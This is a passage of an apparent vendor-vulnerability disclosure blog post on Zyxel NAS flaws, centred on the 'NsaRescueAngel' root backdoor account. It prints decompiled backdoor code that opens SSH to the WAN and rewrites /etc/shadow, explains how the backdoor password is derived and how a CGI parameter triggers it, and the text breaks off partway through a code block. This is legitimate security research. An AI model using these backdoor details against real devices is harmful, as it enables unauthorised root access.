<p>The main logic of this device is implemented in a server built on CherryPy running under Python 2. This server runs behind an Apache httpd server, which contains the “authentication” module.</p>



<p>The Python server is heavily controlled by user input being filtered either on the endpoint handler itself or in a previous step, and then passed into “<a>eval(</a>)” function calls responsible for importing various “modules”. This is an illogical design choice. The only reason I can see for this would be that they wouldn’t need to add and register paths or endpoints during development, enabling a more “dynamic” workflow.</p>



<p>This is a rather silly idea, since it requires filtering for every conceivable attack and injection before being considered anything you should ever pass into “eval()”. Looking at the vendors and devices history and nature of vulnerabilities, it becomes apparent that this is not a feasible strategy. &nbsp;</p>



<p>Previous vulnerabilities have been “patched” by adding more filters and moving endpoints around, instead of tackling the root issue of code being “<a>eval(</a>)” dependent. Filtering and authentication hasn’t been centralized, and it is up to each endpoint to determine whether authentication applies or provided data is safe enough for “eval()”. This design choice is a significant issue with this implementation.</p>



<p>In our command injection vulnerability, we abuse this by crafting a payload which doesn’t get filtered on an endpoint that implemented insufficient filtering.</p>



<p>Zyxel has treated the disclosure process fairly, agreeing to a coordinated disclosure. Despite the fact that the device has reached End-of-Life by the end of last year, they still released patches for the three critical vulnerabilities CVE-2024-29972, CVE-2024-29973, and CVE-2024-29974. Furthermore, as the device has reached End-of-Life, they decided to remove the “Remote Support” account “<a>NsaRescueAngel</a>”.</p>



<h2 class="wp-block-heading" id="h-our-findings"><span class="ez-toc-section" id="our-findings"></span><a>Our findings</a><span class="ez-toc-section-end"></span></h2>



<h3 class="wp-block-heading" id="h-cve-2024-29972-nsarescueangel-backdoor-account"><span class="ez-toc-section" id="cve-2024-29972-%e2%80%93-nsarescueangel-backdoor-account"></span><a>CVE-2024-29972 &#8211; </a>NsaRescueAngel Backdoor Account<span class="ez-toc-section-end"></span></h3>



<p>A few months later, shortly after IBM had released their blog, I was tasked with preparing a presentation to display my department to students from Blekinge Institute of Technology. I decided to perform a presentation where I went through how the Outpost24 Vulnerability Research department would go from a known CVE into a developed proof of concept scan/detection script, using my previous work on CVE-2023-27992. I needed to get some pretty pictures for the Zyxel device (CVE-2023-27992), so I opened my project files in <a>Ghidra</a>, as well as the unpacked firmware dumps. While already there, I decided to take a shorter detour and dig into what other modules were available in the firmware for the fun of it.</p>



<p>I found a CGI endpoint named <a>remote_help-cgi</a> that stuck out to me due to its name hinting the presence of remote support. The fact that the SUID bit was set struck me as a red flag.</p>



<figure class="wp-block-image size-full"><img decoding="async" src="//outpost24.com/wp-content/plugins/a3-lazy-load/assets/images/lazy_placeholder.gif" data-lazy-type="image" data-src="https://outpost24.com/fr/wp-content/uploads/sites/3/2024/05/Picture-1.jpg" alt="" class="lazy lazy-hidden wp-image-5611" /><noscript><img decoding="async" src="https://outpost24.com/fr/wp-content/uploads/sites/3/2024/05/Picture-1.jpg" alt="" class="wp-image-5611" /></noscript></figure>



<p>By looking at some of the embedded strings in the remote_help-cgi binary, we can see that something seems&#8230; off.</p>



<figure class="wp-block-image size-full"><img decoding="async" src="//outpost24.com/wp-content/plugins/a3-lazy-load/assets/images/lazy_placeholder.gif" data-lazy-type="image" data-src="https://outpost24.com/fr/wp-content/uploads/sites/3/2024/05/image6.jpg" alt="" class="lazy lazy-hidden wp-image-5612" /><noscript><img decoding="async" src="https://outpost24.com/fr/wp-content/uploads/sites/3/2024/05/image6.jpg" alt="" class="wp-image-5612" /></noscript></figure>



<figure class="wp-block-image size-full"><img decoding="async" src="//outpost24.com/wp-content/plugins/a3-lazy-load/assets/images/lazy_placeholder.gif" data-lazy-type="image" data-src="https://outpost24.com/fr/wp-content/uploads/sites/3/2024/05/image7.jpg" alt="" class="lazy lazy-hidden wp-image-5613" /><noscript><img decoding="async" src="https://outpost24.com/fr/wp-content/uploads/sites/3/2024/05/image7.jpg" alt="" class="wp-image-5613" /></noscript></figure>



<p>My first thought was ”Oh my, this is suspicious”. The shell script sadly did not exist anymore, only the reference remained.</p>



<p>I decided to check the same files in the latest available firmware (released January 25, 2024) which showed the same strings were present, but still no shell script (never found it).</p>



<p>I proceeded to feed the remote_help-cgi binary into Ghidra. Following what locations referred to these interesting strings I proceeded to find:</p>



<div class="wp-block-kevinbatdorf-code-block-pro" data-code-block-pro-font-family="Code-Pro-JetBrains-Mono" style="font-size:.875rem;font-family:Code-Pro-JetBrains-Mono,ui-monospace,SFMono-Regular,Menlo,Monaco,Consolas,monospace;line-height:1.25rem;--cbp-tab-width:2"><span role="button" data-code="int cool_backdoor(void)
{
  // [...]
  fwrite(&quot;Content-Type: text/html\r\n\r\n&quot;,1,0x1b,gcgiOut);
  fwrite(&quot;&lt;html&gt;\n&lt;head&gt;\n&lt;/head&gt;\n&lt;body&gt;\n&lt;br&gt;\n&quot;,1,0x22,gcgiOut);
  setuid(0);
  system(&quot;killall -9 sshd&quot;);
  system(&quot;mount devpts /dev/pts -t devpts&quot;);
  system(&quot;chmod 0700 /etc/ssh/*&quot;);
  system(&quot;start-stop-daemon -b -S -N 5 -x /sbin/sshd -- -p 22&quot;);
  system(&quot;/usr/local/upnp/DelPortMapping.sh TCP 22 &gt; /dev/null 2&gt;&amp;1&quot;);
  system(&quot;/usr/local/upnp/AddPortMapping.sh TCP 22 22 \&quot;WAN SSH\&quot; &gt; /dev/null 2&gt;&amp;1&quot;);
  retcode = get_command_output_lines(&quot;makekey&quot;,makekey_buf);
  // [...]
  index = strlen(makekey_buf);
  makekey_buf[index] = 't';
  index = strlen(makekey_buf);
  makekey_buf[index] = 'd';
  index = strlen(makekey_buf);
  makekey_buf[index] = 'T';
  index = strlen(makekey_buf);
  makekey_buf[index] = '\0';
  sprintf(makepwd_command,&quot;makepwd %s&quot;,makekey_buf);
  retcode = get_command_output_lines(makepwd_command,(char *)&amp;local_98);
  // [...]
  old_shadow_h = fopen(&quot;/etc/shadow&quot;,&quot;r&quot;);
  // [...]
  new_shadow_h = fopen(&quot;/etc/shadow.new&quot;,&quot;w&quot;);
  // [...]
  while (_Var1 = __getdelim(&amp;local_19c,&amp;local_1a0,L'\n',old_shadow_h), __s = local_19c, -1 &lt; _Var1)
  {
    retcode = strncmp(local_19c,&quot;NsaRescueAngel&quot;,0xe);
    if (retcode == 0) {
      fprintf(new_shadow_h,&quot;NsaRescueAngel:%s:13493:0:99999:7:::\n&quot;,&amp;local_98);
    }
    else {
      fputs(__s,new_shadow_h);
    }
  }
  // [...]
  unlink(&quot;/etc/shadow&quot;);
  rename(&quot;/etc/shadow.new&quot;,&quot;/etc/shadow&quot;);
  // [...]
  return 0;
}" style="color:#d8dee9ff" aria-label="Copy" class="code-block-pro-copy-button"></span><pre class="shiki nord" style="background-color: #2e3440ff"><code><span class="line"><span style="color: #81A1C1">int</span><span style="color: #D8DEE9FF"> </span><span style="color: #88C0D0">cool_backdoor</span><span style="color: #ECEFF4">(</span><span style="color: #81A1C1">void</span><span style="color: #ECEFF4">)</span></span>
<span class="line"><span style="color: #ECEFF4">{</span></span>
<span class="line"><span style="color: #ECEFF4">  </span><span style="color: #616E88">// [...]</span></span>
<span class="line"><span style="color: #D8DEE9FF">  </span><span style="color: #88C0D0">fwrite</span><span style="color: #ECEFF4">(</span><span style="color: #ECEFF4">&quot;</span><span style="color: #A3BE8C">Content-Type: text/html</span><span style="color: #EBCB8B">\r\n\r\n</span><span style="color: #ECEFF4">&quot;</span><span style="color: #ECEFF4">,</span><span style="color: #B48EAD">1</span><span style="color: #ECEFF4">,</span><span style="color: #81A1C1">0x</span><span style="color: #B48EAD">1b</span><span style="color: #ECEFF4">,</span><span style="color: #D8DEE9FF">gcgiOut</span><span style="color: #ECEFF4">)</span><span style="color: #81A1C1">;</span></span>
<span class="line"><span style="color: #D8DEE9FF">  </span><span style="color: #88C0D0">fwrite</span><span style="color: #ECEFF4">(</span><span style="color: #ECEFF4">&quot;</span><span style="color: #A3BE8C">&lt;html&gt;</span><span style="color: #EBCB8B">\n</span><span style="color: #A3BE8C">&lt;head&gt;</span><span style="color: #EBCB8B">\n</span><span style="color: #A3BE8C">&lt;/head&gt;</span><span style="color: #EBCB8B">\n</span><span style="color: #A3BE8C">&lt;body&gt;</span><span style="color: #EBCB8B">\n</span><span style="color: #A3BE8C">&lt;br&gt;</span><span style="color: #EBCB8B">\n</span><span style="color: #ECEFF4">&quot;</span><span style="color: #ECEFF4">,</span><span style="color: #B48EAD">1</span><span style="color: #ECEFF4">,</span><span style="color: #81A1C1">0x</span><span style="color: #B48EAD">22</span><span style="color: #ECEFF4">,</span><span style="color: #D8DEE9FF">gcgiOut</span><span style="color: #ECEFF4">)</span><span style="color: #81A1C1">;</span></span>
<span class="line"><span style="color: #D8DEE9FF">  </span><span style="color: #88C0D0">setuid</span><span style="color: #ECEFF4">(</span><span style="color: #B48EAD">0</span><span style="color: #ECEFF4">)</span><span style="color: #81A1C1">;</span></span>
<span class="line"><span style="color: #D8DEE9FF">  </span><span style="color: #88C0D0">system</span><span style="color: #ECEFF4">(</span><span style="color: #ECEFF4">&quot;</span><span style="color: #A3BE8C">killall -9 sshd</span><span style="color: #ECEFF4">&quot;</span><span style="color: #ECEFF4">)</span><span style="color: #81A1C1">;</span></span>
<span class="line"><span style="color: #D8DEE9FF">  </span><span style="color: #88C0D0">system</span><span style="color: #ECEFF4">(</span><span style="color: #ECEFF4">&quot;</span><span style="color: #A3BE8C">mount devpts /dev/pts -t devpts</span><span style="color: #ECEFF4">&quot;</span><span style="color: #ECEFF4">)</span><span style="color: #81A1C1">;</span></span>
<span class="line"><span style="color: #D8DEE9FF">  </span><span style="color: #88C0D0">system</span><span style="color: #ECEFF4">(</span><span style="color: #ECEFF4">&quot;</span><span style="color: #A3BE8C">chmod 0700 /etc/ssh/*</span><span style="color: #ECEFF4">&quot;</span><span style="color: #ECEFF4">)</span><span style="color: #81A1C1">;</span></span>
<span class="line"><span style="color: #D8DEE9FF">  </span><span style="color: #88C0D0">system</span><span style="color: #ECEFF4">(</span><span style="color: #ECEFF4">&quot;</span><span style="color: #A3BE8C">start-stop-daemon -b -S -N 5 -x /sbin/sshd -- -p 22</span><span style="color: #ECEFF4">&quot;</span><span style="color: #ECEFF4">)</span><span style="color: #81A1C1">;</span></span>
<span class="line"><span style="color: #D8DEE9FF">  </span><span style="color: #88C0D0">system</span><span style="color: #ECEFF4">(</span><span style="color: #ECEFF4">&quot;</span><span style="color: #A3BE8C">/usr/local/upnp/DelPortMapping.sh TCP 22 &gt; /dev/null 2&gt;&amp;1</span><span style="color: #ECEFF4">&quot;</span><span style="color: #ECEFF4">)</span><span style="color: #81A1C1">;</span></span>
<span class="line"><span style="color: #D8DEE9FF">  </span><span style="color: #88C0D0">system</span><span style="color: #ECEFF4">(</span><span style="color: #ECEFF4">&quot;</span><span style="color: #A3BE8C">/usr/local/upnp/AddPortMapping.sh TCP 22 22 </span><span style="color: #EBCB8B">\&quot;</span><span style="color: #A3BE8C">WAN SSH</span><span style="color: #EBCB8B">\&quot;</span><span style="color: #A3BE8C"> &gt; /dev/null 2&gt;&amp;1</span><span style="color: #ECEFF4">&quot;</span><span style="color: #ECEFF4">)</span><span style="color: #81A1C1">;</span></span>
<span class="line"><span style="color: #D8DEE9FF">  retcode </span><span style="color: #81A1C1">=</span><span style="color: #D8DEE9FF"> </span><span style="color: #88C0D0">get_command_output_lines</span><span style="color: #ECEFF4">(</span><span style="color: #ECEFF4">&quot;</span><span style="color: #A3BE8C">makekey</span><span style="color: #ECEFF4">&quot;</span><span style="color: #ECEFF4">,</span><span style="color: #D8DEE9FF">makekey_buf</span><span style="color: #ECEFF4">)</span><span style="color: #81A1C1">;</span></span>
<span class="line"><span style="color: #ECEFF4">  </span><span style="color: #616E88">// [...]</span></span>
<span class="line"><span style="color: #D8DEE9FF">  index </span><span style="color: #81A1C1">=</span><span style="color: #D8DEE9FF"> </span><span style="color: #88C0D0">strlen</span><span style="color: #ECEFF4">(</span><span style="color: #D8DEE9FF">makekey_buf</span><span style="color: #ECEFF4">)</span><span style="color: #81A1C1">;</span></span>
<span class="line"><span style="color: #D8DEE9FF">  makekey_buf</span><span style="color: #ECEFF4">[</span><span style="color: #D8DEE9FF">index</span><span style="color: #ECEFF4">]</span><span style="color: #D8DEE9FF"> </span><span style="color: #81A1C1">=</span><span style="color: #D8DEE9FF"> </span><span style="color: #ECEFF4">&#039;</span><span style="color: #A3BE8C">t</span><span style="color: #ECEFF4">&#039;</span><span style="color: #81A1C1">;</span></span>
<span class="line"><span style="color: #D8DEE9FF">  index </span><span style="color: #81A1C1">=</span><span style="color: #D8DEE9FF"> </span><span style="color: #88C0D0">strlen</span><span style="color: #ECEFF4">(</span><span style="color: #D8DEE9FF">makekey_buf</span><span style="color: #ECEFF4">)</span><span style="color: #81A1C1">;</span></span>
<span class="line"><span style="color: #D8DEE9FF">  makekey_buf</span><span style="color: #ECEFF4">[</span><span style="color: #D8DEE9FF">index</span><span style="color: #ECEFF4">]</span><span style="color: #D8DEE9FF"> </span><span style="color: #81A1C1">=</span><span style="color: #D8DEE9FF"> </span><span style="color: #ECEFF4">&#039;</span><span style="color: #A3BE8C">d</span><span style="color: #ECEFF4">&#039;</span><span style="color: #81A1C1">;</span></span>
<span class="line"><span style="color: #D8DEE9FF">  index </span><span style="color: #81A1C1">=</span><span style="color: #D8DEE9FF"> </span><span style="color: #88C0D0">strlen</span><span style="color: #ECEFF4">(</span><span style="color: #D8DEE9FF">makekey_buf</span><span style="color: #ECEFF4">)</span><span style="color: #81A1C1">;</span></span>
<span class="line"><span style="color: #D8DEE9FF">  makekey_buf</span><span style="color: #ECEFF4">[</span><span style="color: #D8DEE9FF">index</span><span style="color: #ECEFF4">]</span><span style="color: #D8DEE9FF"> </span><span style="color: #81A1C1">=</span><span style="color: #D8DEE9FF"> </span><span style="color: #ECEFF4">&#039;</span><span style="color: #A3BE8C">T</span><span style="color: #ECEFF4">&#039;</span><span style="color: #81A1C1">;</span></span>
<span class="line"><span style="color: #D8DEE9FF">  index </span><span style="color: #81A1C1">=</span><span style="color: #D8DEE9FF"> </span><span style="color: #88C0D0">strlen</span><span style="color: #ECEFF4">(</span><span style="color: #D8DEE9FF">makekey_buf</span><span style="color: #ECEFF4">)</span><span style="color: #81A1C1">;</span></span>
<span class="line"><span style="color: #D8DEE9FF">  makekey_buf</span><span style="color: #ECEFF4">[</span><span style="color: #D8DEE9FF">index</span><span style="color: #ECEFF4">]</span><span style="color: #D8DEE9FF"> </span><span style="color: #81A1C1">=</span><span style="color: #D8DEE9FF"> </span><span style="color: #ECEFF4">&#039;</span><span style="color: #EBCB8B">\0</span><span style="color: #ECEFF4">&#039;</span><span style="color: #81A1C1">;</span></span>
<span class="line"><span style="color: #D8DEE9FF">  </span><span style="color: #88C0D0">sprintf</span><span style="color: #ECEFF4">(</span><span style="color: #D8DEE9FF">makepwd_command</span><span style="color: #ECEFF4">,</span><span style="color: #ECEFF4">&quot;</span><span style="color: #A3BE8C">makepwd %s</span><span style="color: #ECEFF4">&quot;</span><span style="color: #ECEFF4">,</span><span style="color: #D8DEE9FF">makekey_buf</span><span style="color: #ECEFF4">)</span><span style="color: #81A1C1">;</span></span>
<span class="line"><span style="color: #D8DEE9FF">  retcode </span><span style="color: #81A1C1">=</span><span style="color: #D8DEE9FF"> </span><span style="color: #88C0D0">get_command_output_lines</span><span style="color: #ECEFF4">(</span><span style="color: #D8DEE9FF">makepwd_command</span><span style="color: #ECEFF4">,(</span><span style="color: #81A1C1">char</span><span style="color: #D8DEE9FF"> </span><span style="color: #81A1C1">*</span><span style="color: #ECEFF4">)</span><span style="color: #81A1C1">&amp;</span><span style="color: #D8DEE9FF">local_98</span><span style="color: #ECEFF4">)</span><span style="color: #81A1C1">;</span></span>
<span class="line"><span style="color: #ECEFF4">  </span><span style="color: #616E88">// [...]</span></span>
<span class="line"><span style="color: #D8DEE9FF">  old_shadow_h </span><span style="color: #81A1C1">=</span><span style="color: #D8DEE9FF"> </span><span style="color: #88C0D0">fopen</span><span style="color: #ECEFF4">(</span><span style="color: #ECEFF4">&quot;</span><span style="color: #A3BE8C">/etc/shadow</span><span style="color: #ECEFF4">&quot;</span><span style="color: #ECEFF4">,</span><span style="color: #ECEFF4">&quot;</span><span style="color: #A3BE8C">r</span><span style="color: #ECEFF4">&quot;</span><span style="color: #ECEFF4">)</span><span style="color: #81A1C1">;</span></span>
<span class="line"><span style="color: #ECEFF4">  </span><span style="color: #616E88">// [...]</span></span>
<span class="line"><span style="color: #D8DEE9FF">  new_shadow_h </span><span style="color: #81A1C1">=</span><span style="color: #D8DEE9FF"> </span><span style="color: #88C0D0">fopen</span><span style="color: #ECEFF4">(</span><span style="color: #ECEFF4">&quot;</span><span style="color: #A3BE8C">/etc/shadow.new</span><span style="color: #ECEFF4">&quot;</span><span style="color: #ECEFF4">,</span><span style="color: #ECEFF4">&quot;</span><span style="color: #A3BE8C">w</span><span style="color: #ECEFF4">&quot;</span><span style="color: #ECEFF4">)</span><span style="color: #81A1C1">;</span></span>
<span class="line"><span style="color: #ECEFF4">  </span><span style="color: #616E88">// [...]</span></span>
<span class="line"><span style="color: #D8DEE9FF">  </span><span style="color: #81A1C1">while</span><span style="color: #D8DEE9FF"> </span><span style="color: #ECEFF4">(</span><span style="color: #D8DEE9FF">_Var1 </span><span style="color: #81A1C1">=</span><span style="color: #D8DEE9FF"> </span><span style="color: #88C0D0">__getdelim</span><span style="color: #ECEFF4">(</span><span style="color: #81A1C1">&amp;</span><span style="color: #D8DEE9FF">local_19c</span><span style="color: #ECEFF4">,</span><span style="color: #81A1C1">&amp;</span><span style="color: #D8DEE9FF">local_1a0</span><span style="color: #ECEFF4">,</span><span style="color: #D8DEE9FF">L</span><span style="color: #ECEFF4">&#039;</span><span style="color: #EBCB8B">\n</span><span style="color: #ECEFF4">&#039;</span><span style="color: #ECEFF4">,</span><span style="color: #D8DEE9FF">old_shadow_h</span><span style="color: #ECEFF4">),</span><span style="color: #D8DEE9FF"> __s </span><span style="color: #81A1C1">=</span><span style="color: #D8DEE9FF"> local_19c</span><span style="color: #ECEFF4">,</span><span style="color: #D8DEE9FF"> </span><span style="color: #81A1C1">-</span><span style="color: #B48EAD">1</span><span style="color: #D8DEE9FF"> </span><span style="color: #81A1C1">&lt;</span><span style="color: #D8DEE9FF"> _Var1</span><span style="color: #ECEFF4">)</span></span>
<span class="line"><span style="color: #D8DEE9FF">  </span><span style="color: #ECEFF4">{</span></span>
<span class="line"><span style="color: #D8DEE9FF">    retcode </span><span style="color: #81A1C1">=</span><span style="color: #D8DEE9FF"> </span><span style="color: #88C0D0">strncmp</span><span style="color: #ECEFF4">(</span><span style="color: #D8DEE9FF">local_19c</span><span style="color: #ECEFF4">,</span><span style="color: #ECEFF4">&quot;</span><span style="color: #A3BE8C">NsaRescueAngel</span><span style="color: #ECEFF4">&quot;</span><span style="color: #ECEFF4">,</span><span style="color: #81A1C1">0x</span><span style="color: #B48EAD">e</span><span style="color: #ECEFF4">)</span><span style="color: #81A1C1">;</span></span>
<span class="line"><span style="color: #D8DEE9FF">    </span><span style="color: #81A1C1">if</span><span style="color: #D8DEE9FF"> </span><span style="color: #ECEFF4">(</span><span style="color: #D8DEE9FF">retcode </span><span style="color: #81A1C1">==</span><span style="color: #D8DEE9FF"> </span><span style="color: #B48EAD">0</span><span style="color: #ECEFF4">)</span><span style="color: #D8DEE9FF"> </span><span style="color: #ECEFF4">{</span></span>
<span class="line"><span style="color: #D8DEE9FF">      </span><span style="color: #88C0D0">fprintf</span><span style="color: #ECEFF4">(</span><span style="color: #D8DEE9FF">new_shadow_h</span><span style="color: #ECEFF4">,</span><span style="color: #ECEFF4">&quot;</span><span style="color: #A3BE8C">NsaRescueAngel:%s:13493:0:99999:7:::</span><span style="color: #EBCB8B">\n</span><span style="color: #ECEFF4">&quot;</span><span style="color: #ECEFF4">,</span><span style="color: #81A1C1">&amp;</span><span style="color: #D8DEE9FF">local_98</span><span style="color: #ECEFF4">)</span><span style="color: #81A1C1">;</span></span>
<span class="line"><span style="color: #D8DEE9FF">    </span><span style="color: #ECEFF4">}</span></span>
<span class="line"><span style="color: #D8DEE9FF">    </span><span style="color: #81A1C1">else</span><span style="color: #D8DEE9FF"> </span><span style="color: #ECEFF4">{</span></span>
<span class="line"><span style="color: #D8DEE9FF">      </span><span style="color: #88C0D0">fputs</span><span style="color: #ECEFF4">(</span><span style="color: #D8DEE9FF">__s</span><span style="color: #ECEFF4">,</span><span style="color: #D8DEE9FF">new_shadow_h</span><span style="color: #ECEFF4">)</span><span style="color: #81A1C1">;</span></span>
<span class="line"><span style="color: #D8DEE9FF">    </span><span style="color: #ECEFF4">}</span></span>
<span class="line"><span style="color: #D8DEE9FF">  </span><span style="color: #ECEFF4">}</span></span>
<span class="line"><span style="color: #ECEFF4">  </span><span style="color: #616E88">// [...]</span></span>
<span class="line"><span style="color: #D8DEE9FF">  </span><span style="color: #88C0D0">unlink</span><span style="color: #ECEFF4">(</span><span style="color: #ECEFF4">&quot;</span><span style="color: #A3BE8C">/etc/shadow</span><span style="color: #ECEFF4">&quot;</span><span style="color: #ECEFF4">)</span><span style="color: #81A1C1">;</span></span>
<span class="line"><span style="color: #D8DEE9FF">  </span><span style="color: #88C0D0">rename</span><span style="color: #ECEFF4">(</span><span style="color: #ECEFF4">&quot;</span><span style="color: #A3BE8C">/etc/shadow.new</span><span style="color: #ECEFF4">&quot;</span><span style="color: #ECEFF4">,</span><span style="color: #ECEFF4">&quot;</span><span style="color: #A3BE8C">/etc/shadow</span><span style="color: #ECEFF4">&quot;</span><span style="color: #ECEFF4">)</span><span style="color: #81A1C1">;</span></span>
<span class="line"><span style="color: #ECEFF4">  </span><span style="color: #616E88">// [...]</span></span>
<span class="line"><span style="color: #D8DEE9FF">  </span><span style="color: #81A1C1">return</span><span style="color: #D8DEE9FF"> </span><span style="color: #B48EAD">0</span><span style="color: #81A1C1">;</span></span>
<span class="line"><span style="color: #ECEFF4">}</span></span></code></pre></div>



<p>This function restarts the SSH service, sets up UPnP port mapping (this is why you should disable that in your home router!) to map port 22 to WAN, and proceeds to generate a password.</p>



<p>The password is generated by calling “makekey” with zero arguments, appending “tdT” to the result, and runs that string into “makepwd” to get a hashed password. This is inserted into “/etc/shadow” for the NsaRescueAngel account.</p>



<p>Looking at the contents of the relevant files before enabling the backdoor we see the following:&nbsp;</p>



<div class="wp-block-kevinbatdorf-code-block-pro" data-code-block-pro-font-family="Code-Pro-JetBrains-Mono" style="font-size:.875rem;font-family:Code-Pro-JetBrains-Mono,ui-monospace,SFMono-Regular,Menlo,Monaco,Consolas,monospace;line-height:1.25rem;--cbp-tab-width:2"><span role="button" data-code="~ $ cat /etc/passwd
root:x:0:0:root:/root:/bin/sh
NsaRescueAngel:x:0:0:NsaRescueAngel:/:/bin/sh

~ $ cat /etc/shadow
root:/*snip*/0:13013:0:99999:7:::
NsaRescueAngel:!!:13493:0:99999:7:::¡" style="color:#d8dee9ff" aria-label="Copy" class="code-block-pro-copy-button"></span><pre class="shiki nord" style="background-color: #2e3440ff"><code><span class="line"><span style="color: #81A1C1">~</span><span style="color: #D8DEE9FF"> $ cat /etc/passwd</span></span>
<span class="line"><span style="color: #88C0D0">root:x:0:0:root:/root:/bin/sh</span></span>
<span class="line"><span style="color: #88C0D0">NsaRescueAngel:x:0:0:NsaRescueAngel:/:/bin/sh</span></span>
<span class="line"></span>
<span class="line"><span style="color: #81A1C1">~</span><span style="color: #D8DEE9FF"> $ cat /etc/shadow</span></span>
<span class="line"><span style="color: #88C0D0">root:/*snip*/0:13013:0:99999:7:::</span></span>
<span class="line"><span style="color: #88C0D0">NsaRescueAngel:!!:13493:0:99999:7:::¡</span></span></code></pre></div>



<p>The NsaRescueAngel account has root privileges.</p>



<p>Now that we know a bit more about the backdoor, how do we enable it? Tracking the references to it I noticed there was a hardcoded list of structs mapping strings to function pointers. Specifically, this handler was mapped to “sshd_tdc”.</p>



<figure class="wp-block-image size-full"><img decoding="async" src="//outpost24.com/wp-content/plugins/a3-lazy-load/assets/images/lazy_placeholder.gif" data-lazy-type="image" data-src="https://outpost24.com/fr/wp-content/uploads/sites/3/2024/05/image8.png" alt="" class="lazy lazy-hidden wp-image-5615" /><noscript><img decoding="async" src="https://outpost24.com/fr/wp-content/uploads/sites/3/2024/05/image8.png" alt="" class="wp-image-5615" /></noscript></figure>



<p>Looking up where this list is accessed from, we find:</p>



<div class="wp-block-kevinbatdorf-code-block-pro" data-code-block-pro-font-family="Code-Pro-JetBrains-Mono" style="font-size:.875rem;font-family:Code-Pro-JetBrains-Mono,ui-monospace,SFMono-Regular,Menlo,Monaco,Consolas,monospace;line-height:1.25rem;--cbp-tab-width:2"><span role="button" data-code="gcgiReturnType main(void) 
{ 
  // [...]
  ret = initCgi(); 
  if (ret != GCGIFATALERROR) { 
    umask(0); 
    handlers_ptr = KeyHandlerMap_ARRAY_00021ba0; 
    gcgiFetchString(&quot;type&quot;,type_field,511); 
    index = KeyHandlerMap_ARRAY_00021ba0[0].index; 
    while (index != 5) { 
      index = strcmp(handlers_ptr-&gt;Key,type_field); 
      if (index == 0) { 
        chosen_handler = handlers_ptr-&gt;Handler; 
        goto LAB_00010c78; 
      } 
      handlers_ptr = handlers_ptr + 1; 
      index = handlers_ptr-&gt;index; 
    } 
    chosen_handler = (callback *)0x0; 
LAB_00010c78: 
    userid = geteuid(); 
        setuid(userid); 
    signal(0x11,(__sighandler_t)0x1); 
    ret = (*chosen_handler)(); 
    freeCgi(); 
  } 
  return ret; 
}" style="color:#d8dee9ff" aria-label="Copy" class="code-block-pro-copy-button"></span><pre class="shiki nord" style="background-color: #2e3440ff"><code><span class="line"><span style="color: #D8DEE9FF">gcgiReturnType </span><span style="color: #88C0D0">main</span><span style="color: #ECEFF4">(</span><span style="color: #81A1C1">void</span><span style="color: #ECEFF4">)</span><span style="color: #D8DEE9FF"> </span></span>
<span class="line"><span style="color: #ECEFF4">{</span><span style="color: #D8DEE9FF"> </span></span>
<span class="line"><span style="color: #ECEFF4">  </span><span style="color: #616E88">// [...]</span></span>
<span class="line"><span style="color: #D8DEE9FF">  ret </span><span style="color: #81A1C1">=</span><span style="color: #D8DEE9FF"> </span><span style="color: #88C0D0">initCgi</span><span style="color: #ECEFF4">()</span><span style="color: #81A1C1">;</span><span style="color: #D8DEE9FF"> </span></span>
<span class="line"><span style="color: #D8DEE9FF">  </span><span style="color: #81A1C1">if</span><span style="color: #D8DEE9FF"> </span><span style="color: #ECEFF4">(</span><span style="color: #D8DEE9FF">ret </span><span style="color: #81A1C1">!=</span><span style="color: #D8DEE9FF"> GCGIFATALERROR</span><span style="color: #ECEFF4">)</span><span style="color: #D8DEE9FF"> </span><span style="color: #ECEFF4">{</span><span style="color: #D8DEE9FF"> </span></span>
<span class="line"><span style="color: #D8DEE9FF">    </span><span style="color: #88C0D0">umask</span><span style="color: #ECEFF4">(</span><span style="color: #B48EAD">0</span><span style="color: #ECEFF4">)</span><span style="color: #81A1C1">;</span><span style="color: #D8DEE9FF"> </span></span>
<span class="line"><span style="color: #D8DEE9FF">    handlers_ptr </span><span style="color: #81A1C1">=</span><span style="color: #D8DEE9FF"> KeyHandlerMap_ARRAY_00021ba0</span><span style="color: #81A1C1">;</span><span style="color: #D8DEE9FF"> </span></span>
<span class="line"><span style="color: #D8DEE9FF">    </span><span style="color: #88C0D0">gcgiFetchString</span><span style="color: #ECEFF4">(</span><span style="color: #ECEFF4">&quot;</span><span style="color: #A3BE8C">type</span><span style="color: #ECEFF4">&quot;</span><span style="color: #ECEFF4">,</span><span style="color: #D8DEE9FF">type_field</span><span style="color: #ECEFF4">,</span><span style="color: #B48EAD">511</span><span style="color: #ECEFF4">)</span><span style="color: #81A1C1">;</span><span style="color: #D8DEE9FF"> </span></span>
<span class="line"><span style="color: #D8DEE9FF">    index </span><span style="color: #81A1C1">=</span><span style="color: #D8DEE9FF"> KeyHandlerMap_ARRAY_00021ba0</span><span style="color: #ECEFF4">[</span><span style="color: #B48EAD">0</span><span style="color: #ECEFF4">].</span><span style="color: #D8DEE9">index</span><span style="color: #81A1C1">;</span><span style="color: #D8DEE9FF"> </span></span>
<span class="line"><span style="color: #D8DEE9FF">    </span><span style="color: #81A1C1">while</span><span style="color: #D8DEE9FF"> </span><span style="color: #ECEFF4">(</span><span style="color: #D8DEE9FF">index </span><span style="color: #81A1C1">!=</span><span style="color: #D8DEE9FF"> </span><span style="color: #B48EAD">5</span><span style="color: #ECEFF4">)</span><span style="color: #D8DEE9FF"> </span><span style="color: #ECEFF4">{</span><span style="color: #D8DEE9FF"> </span></span>
<span class="line"><span style="color: #D8DEE9FF">      index </span><span style="color: #81A1C1">=</span><span style="color: #D8DEE9FF"> </span><span style="color: #88C0D0">strcmp</span><span style="color: #ECEFF4">(</span><span style="color: #D8DEE9">handlers_ptr</span><span style="color: #81A1C1">-&gt;</span><span style="color: #D8DEE9">Key</span><span style="color: #ECEFF4">,</span><span style="color: #D8DEE9FF">type_field</span><span style="color: #ECEFF4">)</span><span style="color: #81A1C1">;</span><span style="color: #D8DEE9FF"> </span></span>
<span class="line"><span style="color: #D8DEE9FF">      </span><span style="color: #81A1C1">if</span><span style="color: #D8DEE9FF"> </span><span style="color: #ECEFF4">(</span><span style="color: #D8DEE9FF">index </span><span style="color: #81A1C1">==</span><span style="color: #D8DEE9FF"> </span><span style="color: #B48EAD">0</span><span style="color: #ECEFF4">)</span><span style="color: #D8DEE9FF"> </span><span style="color: #ECEFF4">{</span><span style="color: #D8DEE9FF"> </span></span>
